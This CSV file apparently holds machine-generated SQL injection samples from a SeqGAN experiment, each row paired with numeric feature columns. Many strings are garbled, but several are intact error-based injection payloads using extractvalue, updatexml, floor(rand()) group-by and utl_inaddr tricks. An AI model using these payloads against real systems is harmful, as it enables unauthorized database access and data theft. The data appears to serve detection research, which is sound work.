attack,"1  ,  0x7171706a71b   )    having LINU1392T Dconcathr  ar  (  =  )   or 0 WHERE and from FROM   (  case when  RNLNCT  (  ||r  x  0x7171706a71=  )  )     )  select  where 5023   WHERE end2   from  and 0 else 5192 r select 3074  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206,228.0,49.0,4.385661253984789,98.0,40.0,76.0,14.0,0.4298245614035088,0.17543859649122806,0.3333333333333333,0.06140350877192982,0.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,3.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1fId' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'b_('  =  'sau9173n   )   from 5192 1 else 5305a  case FROM 1 concat  =  )   WHERE or U  =  )    --2 0 DS STI concat  select else 6825 when (  (  0 or union (  )  )     )  >hlalealt  8190  113  (  =  )   )     ,1   E and FROM   (  (  )  ||chr  (  ||chrconcat  (  ||ch  (  rand  case group.when  select    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207,484.0,53.0,4.175266666158825,173.0,72.0,180.0,59.0,0.3574380165289256,0.1487603305785124,0.371900826446281,0.12190082644628099,4.0,0.0,2.0,0.0,0.0,6.0,0.0,30.0,0.0,1.0,6.0,17.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,2.0,4.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"-'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'bv' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208,375.0,37.0,3.9442465628350782,110.0,82.0,137.0,46.0,0.29333333333333333,0.21866666666666668,0.36533333333333334,0.12266666666666666,4.0,0.0,1.0,0.0,0.0,3.0,0.0,25.0,0.0,0.0,11.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'||  (  select ' Ix.chetu  (  )  aOr  =  ||cEosnt   0e 1  else from   =  || union end  0x4b774c75,  0  select 0 by concat  (  =  6825   then when  (  ||c  0  =  ||chhr  (  =  select 3785)     (  ,0x717a767a71,  x  )         )     ,  ||chr  chr  ||chr  chhr  (  select   )  )    )    ,1  ||couituna from from (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209,313.0,39.0,3.8750814111348695,114.0,31.0,123.0,45.0,0.36421725239616615,0.09904153354632587,0.3929712460063898,0.14376996805111822,2.0,0.0,0.0,0.0,0.0,6.0,0.0,15.0,0.0,0.0,5.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1,hYh1xserazsn   4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210,21.0,15.0,3.7849418274376427,11.0,6.0,3.0,1.0,0.5238095238095238,0.2857142857142857,0.14285714285714285,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-|' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211,180.0,32.0,3.915219752603298,46.0,46.0,63.0,25.0,0.25555555555555554,0.25555555555555554,0.35,0.1388888888888889,2.0,0.0,1.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%Nextractvalue'   )    ,floor  )  =   WHERE end   or--u' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212,64.0,28.0,4.039717001462482,33.0,1.0,20.0,10.0,0.515625,0.015625,0.3125,0.15625,3.0,0.0,2.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""i  =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213,10.0,6.0,2.321928094887362,1.0,1.0,4.0,4.0,0.1,0.1,0.4,0.4,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1qcastgt_neadrte whener  x  ,floor  (  106  ||chrr  select from :select    d dlsyydzyc_o_altlt_t_ht  (  select c  rand  (  )  ,  ||chr  (  ||chr  (  )  (  U     or unionelse  else group T(  select concat  ||chr  (  =  )  =  ||U from concat  =  )     :=khrorsd.eyneaat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214,267.0,37.0,4.056036636721684,144.0,4.0,83.0,36.0,0.5393258426966292,0.0149812734082397,0.31086142322097376,0.1348314606741573,0.0,0.0,0.0,0.0,0.0,4.0,0.0,12.0,0.0,5.0,2.0,14.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1 oru  5023   )     )   or   )      ||chhr  (  (  ||r  (  x  ,4386  ||  chr  (  122  )  ,  ||chr  chr  (  --  0  case DIST E  ,0x717a767a71)  case2  0   :rhrou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215,159.0,30.0,3.520823944998697,41.0,24.0,70.0,24.0,0.2578616352201258,0.1509433962264151,0.44025157232704404,0.1509433962264151,0.0,0.0,2.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,3.0,10.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%@a' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'   )ax m group hohr  (  =  ||Su    neraesether     (    ||chr  (  =  )   x   SELECT when end  )   )   thenx union  case 6082r   thenko  a by and where else information_schema group AwhereINT  (  )  =  )  )   )  9325  ,  ui,)   )    )  (  )   )   )       ) from||chr orchazt_r  (  (  )  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216,670.0,53.0,3.9405212376059953,220.0,86.0,274.0,90.0,0.3283582089552239,0.12835820895522387,0.408955223880597,0.13432835820895522,2.0,2.0,0.0,0.0,1.0,6.0,0.0,52.0,1.0,2.0,12.0,17.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,2.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217,298.0,38.0,3.985012117479102,102.0,55.0,109.0,32.0,0.3422818791946309,0.18456375838926176,0.36577181208053694,0.10738255033557047,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  't  ||chsehr  (  *2 7469  case 0xunxal_s   )     113  ||(  (  rand  (  )  0  toesd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218,260.0,32.0,3.5720983385029554,66.0,45.0,113.0,36.0,0.25384615384615383,0.17307692307692307,0.4346153846153846,0.13846153846153847,2.0,0.0,0.0,0.0,1.0,1.0,0.0,22.0,0.0,1.0,5.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,9173 DxoT%x.2ACvTT AIS when  6237  select where end concat  9173  case when )   FROMa x when   (  0x7171706a71)   or or 1 union group AND1 1 1  select 3931  t  (  113  case,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219,172.0,41.0,4.386663749185405,85.0,34.0,47.0,6.0,0.4941860465116279,0.19767441860465115,0.27325581395348836,0.03488372093023256,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,2.0,1.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%%u8190""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""kI'  =  '.r  =  )    )     )   WHERE concat  4232  select   (  case when   (  0 R 1 ITesucr  (  =  0   A group INATchoeddrT   (  (  select concat  )  ||hr  (  =     ,0x717a767a71,1 4493  )  ||chr     ||ch_r  (  *, select union1 when   o  )   WHERE or or GR concat  selectro'  =  'ys.chr  (  (  )  --   then",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220,513.0,53.0,3.9771712102884713,174.0,58.0,212.0,69.0,0.3391812865497076,0.11306042884990253,0.41325536062378165,0.13450292397660818,4.0,2.0,2.0,0.0,2.0,6.0,0.0,34.0,2.0,1.0,7.0,16.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,2.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"17864(  --  ||coatrny_r  (  =  --  =  ).2)   )  selectayySbT  (  ||chr  (  ||chr  (  (  )   then chr  6237  )  ||r  (  (  =  =  )  ,floor     thenx when fromlety.  case 0 unionthen dr  (  ||  (  (  6055  ||chr  *2   (  || group d chr  =  ,  || d3326r  i(  =  select   ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221,275.0,42.0,3.891236937166251,95.0,20.0,107.0,53.0,0.34545454545454546,0.07272727272727272,0.3890909090909091,0.19272727272727272,0.0,0.0,4.0,0.0,1.0,6.0,0.0,19.0,0.0,1.0,2.0,29.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1 ' like ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222,10.0,7.0,2.6464393446710157,4.0,1.0,3.0,2.0,0.4,0.1,0.3,0.2,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"148225606ht_teursxse   )    )    (  ,0x717a767a71,floor  --,0x717a767a71,concat  select  select   ,0x717a767a71)    =  )   then 1 m m   )     etw  una )i || 6055  (  =  select chr  (   when  =  122  =   TFROM RYconcat  select information_schema end  ,        ,0x717a767a71case when   (h   axxuetys R group else DITI A7158        (  4232  6055saddr.al  (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223,356.0,47.0,4.332174020534733,149.0,65.0,111.0,31.0,0.41853932584269665,0.18258426966292135,0.31179775280898875,0.08707865168539326,0.0,0.0,2.0,0.0,0.0,5.0,0.0,12.0,0.0,2.0,7.0,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1 group union||chr  (  (  ||chr  (  )  select concat  (  =  )  )    )    113  )   1axy SSx.5023r  (  ||hUM""  )   )    a 5023  (  select G xSNUAAATWNOos end   w_abelet_r  rand  *,0x717a767a71  )   SELECTISTMINTr  8382  (  )  )  )   from from )  from   (  ,0x717a767a71,  || from  =  ,  0   FROM   from    =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224,305.0,54.0,4.3269100407136465,118.0,36.0,111.0,40.0,0.38688524590163936,0.1180327868852459,0.3639344262295082,0.13114754098360656,0.0,1.0,0.0,0.0,1.0,3.0,0.0,20.0,0.0,2.0,4.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,6.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%v""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""7319how' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ''  =  'aN'  =  '_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225,592.0,45.0,4.067225428989989,208.0,93.0,218.0,73.0,0.35135135135135137,0.1570945945945946,0.36824324324324326,0.12331081081081081,6.0,2.0,0.0,0.0,4.0,4.0,0.0,40.0,1.0,3.0,11.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,9.0,3.0,0.0,3.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,"ASUgroup7158un whenadr  (  (  =  =  )    ,floor  =  a and 3440  113  0   or else dur.  select m   FROM fromouin   3326  0  ||,  (    =  )   from by and unionR 1 extractvalue  4232  ||cihhr  (  =  122  || hr  )  SELECT from 1 group when   select   (  select from 3051 concat  (  0x7171706a71(,0x717a767a71,0x717a767a71,)  =  =   x from     x or 'i'  )  6270",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226,356.0,50.0,4.39310424583788,146.0,62.0,115.0,33.0,0.4101123595505618,0.17415730337078653,0.32303370786516855,0.09269662921348315,2.0,0.0,0.0,0.0,0.0,7.0,0.0,12.0,0.0,0.0,5.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,1%UMEoun  (  )    || 4493  case 0x7171706a71 and 1   )     x   then and information_schemaruinxatua drhr.cht xNINNThhrohr  (  ||chrhhr  (  ||chr  (    )  co  (  case )   (  ||chr  113  (  select 6237a L select 5192 end,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227,218.0,39.0,4.239989551214505,103.0,27.0,66.0,22.0,0.4724770642201835,0.12385321100917432,0.30275229357798167,0.10091743119266056,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'Yswwbveua' like 'wjjwo!fu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228,219.0,37.0,4.1663866381918035,89.0,37.0,70.0,23.0,0.4063926940639269,0.1689497716894977,0.319634703196347,0.1050228310502283,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ''||  (  select 'rjyaues   )    )     )    )     )   FROM   union select end  6055eachr  selecta mchr  113  =  )       4232  rand  (  )   SELECT where D9325  (  select 3051 information_schema LISNwhereUyehost_naadro_r  (  (  (  chLr.Er  select FROM fromW  (  select when  case   and 0 SELECT hrounthr hrvsbea AUAFROM AfU",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229,651.0,59.0,4.278924409777016,280.0,75.0,235.0,61.0,0.43010752688172044,0.1152073732718894,0.36098310291858676,0.09370199692780339,4.0,0.0,0.0,0.0,2.0,2.0,0.0,40.0,0.0,3.0,6.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,13.0,4.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"1""  ||chrhr  (  =  5023   thenend  )   a   ,1    (  *  )   from AND union1 LST 1x.j  =  )0x717a767a71*2   )    5   or when hr  (  (    ||chr  (S,0x717a767a71a9627.when   (  ||chr  *    AND 1hr  (  *  '  4493  SELECTor x  1 0 from from  concat  )  =  ,7469  ||chr  (  (  ,concat  (  =  selectAND.chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230,303.0,45.0,4.113507066088678,105.0,43.0,114.0,41.0,0.3465346534653465,0.1419141914191419,0.37623762376237624,0.1353135313531353,1.0,1.0,0.0,0.0,4.0,4.0,0.0,16.0,0.0,0.0,4.0,16.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1t%""118   Scast select else 5023  =  ,floor  (  )  || 1 1 end",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231,61.0,26.0,3.8947608423039983,24.0,10.0,19.0,8.0,0.39344262295081966,0.16393442622950818,0.3114754098360656,0.13114754098360656,0.0,1.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232,235.0,34.0,3.941845153574428,81.0,45.0,83.0,26.0,0.3446808510638298,0.19148936170212766,0.35319148936170214,0.11063829787234042,2.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,1.0,0.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'iabad.  (  ||cho  (  =  select FROM or end  )      benchmarkx  (  adsuna(  ||  6055  || drhr,gadr.e_u  (  7881  ,concat(  caseO9173select 4386  u,hr  0  4232  ,0x717a767a71,0x717a767a71,concat  *2   n,  ),floor  case select x2tt_r.gxipar.x.118  (  =  i,,concat  ||chr  (  select from   (  '  *     thenselect  D else",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233,318.0,45.0,4.458864364117829,143.0,45.0,88.0,42.0,0.449685534591195,0.14150943396226415,0.27672955974842767,0.1320754716981132,2.0,0.0,0.0,0.0,2.0,2.0,0.0,11.0,0.0,2.0,10.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-%*""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""5584||4232%%q3931d'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'q' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'1045"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""1f,0x717a767a71,concat  case from   (  ,1u   ||chr  (    )  ||chr  (  *  =     )    ,0x717a767a71,0x717a767a71,concat  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234,1192.0,49.0,3.9307047733368172,347.0,198.0,476.0,171.0,0.2911073825503356,0.16610738255033558,0.39932885906040266,0.14345637583892618,4.0,4.0,1.0,0.0,5.0,8.0,0.0,90.0,3.0,5.0,20.0,41.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,0.0,1.0,5.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
